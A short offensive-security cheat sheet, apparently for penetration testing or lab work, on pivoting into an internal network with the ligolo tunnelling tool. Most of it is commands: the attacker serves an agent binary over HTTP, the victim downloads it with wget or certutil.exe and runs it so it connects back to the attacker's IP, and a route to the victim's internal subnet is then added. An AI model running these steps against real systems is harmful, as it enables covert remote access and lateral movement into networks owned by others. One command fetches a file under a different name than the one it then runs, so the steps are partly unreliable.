    Agent- Target machine
    Proxy- Attacker machine (Yours)

There are some prerequisite commands we need to run before launching ligolo. These commands create a tun interface on the Proxy Server (C2).

    sudo ip tuntap add user ''your_username'' mode tun ligolo 
  
    sudo ip link set ligolo up

On your machine get ligolo running:

    ./lin-proxy -selfcert 

setup a python server

     python3 -m http.server

now on victim machine run

LINUX :

     wget vpn_ip:8000/agent
  
    chmod +x lin-agent  
  
    ./lin-agent -connect <attacker IP here>:11601 -ignore-cert  

WINDOWS :

     certutil.exe -urlcache -split -f "http://<Your IP Here>:80/win-agent.exe"
     
     ./win-agent.exe -connect <your IP here>:11601 -ignore-cert


---


Now that we have the target network we want to pivot to in order to reach the other hosts and attack them lets add them to ligolo routes and start them.

     attacker_ip > victim_ip > shared_network
     
we need to set it as :

     attacker_ip > shared_network

On Attacker machine run:

    sudo ip route add 192.168.110.0/24 dev ligolo

where 192.168.110.51 is the ip and 192.168.110.0/24 is the ip range.

---

Go back to your ligolo interface running and type _session_ and select the machine with the new tunnel and type _start._ It will ask you if you want to switch tunnels just select yes..



## Stop and clean

Delete link : 
```
sudo ip link delete ligolo
```

verify :
```
ip link show
```

